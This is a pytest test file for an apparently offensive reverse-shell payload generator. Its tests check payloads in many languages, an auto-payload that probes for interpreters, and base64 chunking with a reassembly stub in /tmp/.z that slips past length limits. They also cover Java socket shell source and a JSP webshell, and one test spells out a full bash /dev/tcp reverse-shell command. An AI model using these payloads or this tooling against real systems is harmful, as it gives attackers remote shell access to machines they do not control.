"""Tests for lib/zas_revshell.py — payload generation."""

import base64

import pytest

import zas_revshell as rs


class TestPayload:
    @pytest.mark.parametrize("lang", rs.available())
    def test_every_language_produces_output(self, lang):
        p = rs.payload("10.0.0.5", 4444, lang)
        assert isinstance(p, str) and 0 < len(p) < 4000

    @pytest.mark.parametrize("lang", rs.available())
    def test_host_and_port_reach_the_payload(self, lang):
        p = rs.payload("10.0.0.5", 4444, lang)
        if lang == "jsp":
            return  # JSP drop-in is an HTTP webshell, not a socket payload
        assert "10.0.0.5" in p
        assert "4444" in p

    @pytest.mark.parametrize("lang", rs.available())
    def test_no_doubled_braces(self, lang):
        # a leftover .format() escaping artefact would render {{ in the payload
        assert "{{" not in rs.payload("10.0.0.5", 4444, lang)

    def test_bash_shape(self):
        p = rs.payload("10.0.0.5", 4444, "bash")
        assert p == 'bash -c \'bash -i >& /dev/tcp/10.0.0.5/4444 0>&1\''

    def test_unknown_language_raises(self):
        with pytest.raises(ValueError):
            rs.payload("h", 1, "cobol")

    def test_error_lists_available(self):
        with pytest.raises(ValueError) as e:
            rs.payload("h", 1, "cobol")
        assert "bash" in str(e.value)


class TestAuto:
    def test_covers_every_language(self):
        a = rs.auto_payload("10.0.0.5", 4444)
        for lang in rs.available():
            if lang == "jsp":
                continue
            assert lang.split()[0] in a

    def test_gates_each_interpreter(self):
        a = rs.auto_payload("10.0.0.5", 4444)
        assert a.count("command -v") >= 15

    def test_extra_langs_are_preferred(self):
        a = rs.auto_payload("10.0.0.5", 4444, extra_langs=["nc"])
        assert a.startswith("command -v nc")

    def test_auto_handles_none_extra(self):
        a = rs.auto_payload("10.0.0.5", 4444, extra_langs=None)
        assert "bash" in a


class TestChunked:
    def test_all_stages_respect_limit(self):
        stages = rs.chunked("10.0.0.5", 4444, "bash", max_len=90, loader="sh")
        assert all(len(s) <= 90 for s in stages)

    def test_fragments_reassemble_to_the_payload(self):
        stages = rs.chunked("10.0.0.5", 4444, "bash", max_len=90, loader="sh")
        frags = [s for s in stages[:-1]]
        b64 = "".join(s.split("echo ", 1)[1].split(" >>", 1)[0] for s in frags)
        assert base64.b64decode(b64).decode() == rs.payload("10.0.0.5", 4444, "bash")

    def test_last_stage_is_the_reassembly_stub(self):
        stages = rs.chunked("10.0.0.5", 4444, "bash", max_len=120, loader="sh")
        assert "base64 -d" in stages[-1]
        assert "/tmp/.z" in stages[-1]

    def test_python_loader_uses_python(self):
        stages = rs.chunked("10.0.0.5", 4444, "bash", max_len=120, loader="python")
        assert "python3" in stages[-1]

    def test_too_small_max_len_raises(self):
        with pytest.raises(ValueError):
            rs.chunked("10.0.0.5", 4444, "bash", max_len=5)

    def test_bad_loader_raises(self):
        with pytest.raises(ValueError):
            rs.chunked("10.0.0.5", 4444, "bash", loader="tcl")

    def test_stub_must_fit(self):
        # a max_len below the stub size must be refused, not silently truncated
        with pytest.raises(ValueError):
            rs.chunked("10.0.0.5", 4444, "powershell", max_len=60, loader="sh")

    def test_long_payload_spans_multiple_stages(self):
        stages = rs.chunked("10.0.0.5", 4444, "powershell", max_len=120, loader="sh")
        assert len(stages) > 2


class TestJavaSource:
    def test_compilable_shape(self):
        src = rs.java_source("10.0.0.5", 4444)
        assert "public class R {" in src
        assert 'new Socket("10.0.0.5", 4444)' in src
        assert src.count("{") == src.count("}")

    def test_custom_class_name(self):
        assert "public class Foo {" in rs.java_source("h", 1, cls="Foo")


class TestMisc:
    def test_available_matches_templates(self):
        assert set(rs.available()) == set(rs._TEMPLATES)

    def test_probe_lists_interpreters(self):
        assert "bash" in rs.detect_available()

    def test_detect_available_signature(self):
        assert rs.detect_available("h", 1) == rs.detect_available()
